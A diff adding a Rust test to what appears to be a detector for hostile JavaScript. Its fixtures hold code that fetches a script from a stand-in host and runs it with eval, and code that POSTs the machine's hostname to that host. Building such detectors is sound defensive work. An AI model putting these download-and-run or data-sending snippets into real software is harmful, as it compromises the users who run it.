@@ -3293,6 +3293,33 @@ mod tests {
     }
 
     #[test]
+    fn received_data_put_in_a_variable_outside_its_callback() {
+        // D-15: the response https.get's callback is given, kept in its variable, then put into a variable declared
+        // outside that callback and run (the text detector found these; the tree did not)
+        let get = |end: &str| {
+            format!(
+                "https.get('https://x.invalid/c', (r) => {{\n  let d = '';\n  r.on('data', (c) => {{ d += c; }});\n  \
+                 r.on('end', () => {{ {} }});\n}});\n",
+                end
+            )
+        };
+        let req = "const https = require('https');\n";
+        assert_eq!(runs(&format!("{}let p;\n{}", req, get("p = d; eval(p);"))), Some("run"));
+        assert_eq!(runs(&format!("{}let p;\n{}setTimeout(() => eval(p), 1000);\n", req, get("p = d;"))), Some("run"));
+        let main = format!("{}function main() {{\n  let p;\n  {}}}\nmain();\n", req, get("p = d; eval(p);"));
+        assert_eq!(runs(&main), Some("run"));
+        // what a library requests for its caller is not the script's download
+        let load = get("p = d; eval(p);").replace("'https://x.invalid/c'", "u");
+        let src = format!("{}let p;\nfunction load(u) {{\n  {}}}\nmodule.exports = load;\n", req, load);
+        assert_eq!(runs(&src), None);
+        // and what is sent, as before
+        let src = "const os = require('os');\nlet p;\nsetTimeout(() => {\n  let d = '';\n  \
+                   setImmediate(() => { d = os.hostname(); });\n  \
+                   setTimeout(() => { p = d; fetch('https://x.invalid/c', { method: 'POST', body: p }); }, 1);\n}, 1);\n";
+        assert_eq!(sent(src), found("identity", "hostname"));
+    }
+
+    #[test]
     fn modules_under_other_names() {
         let src = format!("import os from 'os';\nimport axios from 'axios';\naxios.post('https://{}/c', {{ h: os.hostname() }});\n", HOST);
         assert_eq!(sent(&src), found("identity", "hostname"));
